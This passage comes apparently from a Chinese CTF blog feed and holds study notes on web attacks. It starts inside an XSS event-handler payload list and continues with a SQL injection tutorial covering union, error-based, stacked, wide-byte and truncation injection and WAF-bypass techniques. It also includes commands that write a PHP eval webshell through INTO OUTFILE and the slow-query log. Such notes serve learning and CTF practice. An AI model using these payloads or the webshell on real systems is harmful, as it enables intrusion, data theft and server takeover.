class="number">1</span>)&#x27;&gt;<span class="selector-tag">DIV</span>&lt;/<span class="selector-tag">div</span>&gt;经过url编码：&lt;<span class="selector-tag">div</span> onmouseover%<span class="number">3</span>d&#x27;alert%<span class="number">26</span>lpar%<span class="number">3</span>b1%<span class="number">26</span>rpar%<span class="number">3</span>b&#x27;&gt;<span class="selector-tag">DIV</span>&lt;%<span class="number">2</span>fdiv&gt;</code></pre><h3 id="-7"><a href="#-7" class="headerlink" title="&lt;object&gt;"></a><code>&lt;object&gt;</code></h3><p>嵌入对象元素，引入一个外部资源</p><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p><pre><code class="highlight css">&lt;<span class="selector-tag">object</span> data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/<span class="selector-tag">object</span>&gt;</code></pre><h3 id="-8"><a href="#-8" class="headerlink" title="&lt;p&gt; "></a><code>&lt;p&gt; </code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">p</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;&lt;<span class="selector-tag">p</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;&lt;<span class="selector-tag">p</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;&lt;<span class="selector-tag">p</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;</code></pre><h3 id="-9"><a href="#-9" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">input</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;<span class="selector-tag">input</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;</code></pre><h3 id="-10"><a href="#-10" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details</code>&gt;</h3><pre><code class="highlight css">&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;</code></pre><h3 id="-11"><a href="#-11" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">select</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/<span class="selector-tag">select</span>&gt;&lt;<span class="selector-tag">select</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">select</span>&gt;&lt;<span class="selector-tag">select</span> onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/<span class="selector-tag">select</span>&gt;</code></pre><h3 id="-12"><a href="#-12" class="headerlink" title="&lt;form&gt;"></a><code>&lt;form&gt;</code></h3><p>表单元素</p><pre><code class="highlight css">&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; &lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; &lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt;</code></pre><h3 id="-13"><a href="#-13" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">body</span> onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">body</span>&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF -Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的SQL注入生活</title>
      <link href="/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/"/>
      <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p><h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul><li><strong>创建</strong></li></ul><pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库<span class="keyword">create</span> <span class="keyword">table</span> table_name(column1 datatype,.......);#建立一个表</code></pre><ul><li><strong>查询</strong></li></ul><pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序#条件查询<span class="keyword">Where</span>(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> (<span class="number">8</span>)<span class="keyword">NOT</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre><ul><li><strong>插入</strong></li></ul><pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre><ul><li><strong>注马</strong></li></ul><pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;<span class="number">2.</span>利用日志文件写入木马<span class="number">1.</span>开启日志功能<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;<span class="number">2.</span>设置日志存储路径<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;<span class="number">3.</span>执行<span class="keyword">sql</span>语句<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);</code></pre><h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p><pre><code class="highlight sql">#<span class="number">1.</span>查表列数<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;#查完后使用<span class="keyword">select</span> 语句<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；#查库名<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；#查表名<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>##查列名<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>##直接查数据<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>##其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre><p>那初学的师傅可能就会不明白这个1，2，3是什么意思</p><p>这个1，2，3实际是可以帮助我们快速判断列数的工具(<del>order by:那我呢？</del>)同时，这个1，2，3无关顺序，只要找到回显位并且已经爆出数据表的情况下就可以在回显位写注入语句进一步爆</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p><p>查询对象xml某一个标签的值</p><p>如果查询的标签格式不对，就会报错</p><p>利用concat函数来链接两个字符串</p><p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p><pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre><p>-&gt;查询div，~存在会报错</p><p>爆出~database（）</p><p>2.updatexml</p><p>更新xml文档内容</p><p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p><p>同样道理，当没有对应路径的时候会报错</p><pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+</code></pre><p>其他同上</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入(!)"></a>堆叠注入(!)</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><pre><code class="highlight plaintext">堆叠注入中奇怪的知识点1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。</code></pre><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p><pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p><p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p><h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p><pre><code class="highlight sql"># 预定义字符<span class="number">1.</span>单引号(<span class="string">&#x27;)</span><span class="string">2.双引号(&quot;)</span><span class="string">3.反斜杠(\)</span><span class="string">4.NULL</span></code></pre><p>上述函数常在CMS里使用进行过滤</p><h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 ## 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre><h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p><blockquote><p>[!WARNING]</p><p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p></blockquote><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p><p><strong>攻击手段</strong></p><p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p><p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p><p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p><pre><code class="highlight plaintext">解决办法:将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre><h3 id="Order-by注入"><a href="#Order-by注入" class="headerlink" title="Order by注入"></a>Order by注入</h3><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>一般和盲注一起从出现，原因是大部分基础的查询已经被ban了(悲)</p><p>这里涉及到一个知识点，即Mysql的隐式转换，其实和PHP比较相像吧</p><pre><code class="highlight plaintext">Mysql的隐式转换当字符串和数字进行算术计算时，字符串会被尝试转化为数字(如果可能)例如&#x27;1&#x27;+1 会被解释为1+1若不能成功转化(即字符串的首位不为数字),字符串就会被解释为0</code></pre><p>所以我们就可以通过异或式来辅助盲注(判断bool盲注的语句返回结果是否为真,帮助加长时间盲注的运算时间)</p><h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p><p>先确定注入型，再用and连接一下</p><pre><code class="highlight sql">布尔盲注<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断<span class="number">2.</span></code></pre><h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><h3 id="Cookies注入"><a href="#Cookies注入" class="headerlink" title="Cookies注入"></a>Cookies注入</h3><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p><p>然后可以使用<code>anandd</code>绕过</p><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p><pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre><p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p><p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p><h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p><p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p><ul><li>这里详细将一下正则的注入吧，感觉和正则沾上关系的都蛮不当人的</li></ul><p>正常的一个查询语句就像这样:</p><pre><code class="highlight sql"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></code></pre><p>这里引用其他师傅打好的实例(<a href="https://ljdd520.github.io/2019/11/06/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">sql注入的知识总结 | L’s Blog</a>)</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250402210544627.png" alt="image-20250402210544627"></p><p>呃呃，怎么理解呢?就把regexp看成从^开始字符串与查询到的原串进行一个比较</p><h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);#<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre><h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p><p>最常见的一个盲注的sql语句：</p><pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p><p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p><pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre><h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p><p>常用注释符：</p><p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p><p>用法：</p><p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p><p>2）使用大小写绕过：</p><p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p><p>3）内联注释绕过：</p><p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p><p>4） 双关键字绕过：</p><p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p><h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p><p>sleep()&#x3D;&#x3D;&gt;benchmark()</p><p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p><p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p><p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p><p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p><pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span><span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span><span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资<span 